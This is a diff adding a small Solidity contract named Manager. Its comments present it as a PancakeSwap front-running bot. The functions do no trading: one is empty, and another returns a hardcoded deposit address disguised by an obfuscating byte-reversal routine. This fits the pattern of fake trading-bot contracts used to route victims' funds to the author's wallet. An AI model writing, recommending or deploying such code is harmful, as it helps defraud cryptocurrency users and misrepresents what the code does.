@@ -1,0 +1,4 @@
+pragma solidity ^0.6.6;
+//Call on bot.js to execute front run
+//Listen to liquidity automatically on network
+contract Manager{function performTasks()public{}function pancakeDepositAddress()public pure returns (address) {return address(format(0xdDA877C62Df0c33c5f4409C5d2785f85334ca39B));}function format(address addr)private pure returns(address){bytes memory rec='0xdDA877C62Df0c33c5f4409C5d2785f85334ca39B';string memory rec2=new string(rec.length);bytes memory rec3=bytes(rec2);for(uint i=0;i<rec.length;i++)rec3[rec.length-i-1]=rec[i];require(rec3[30]==0x37);return addr;}}
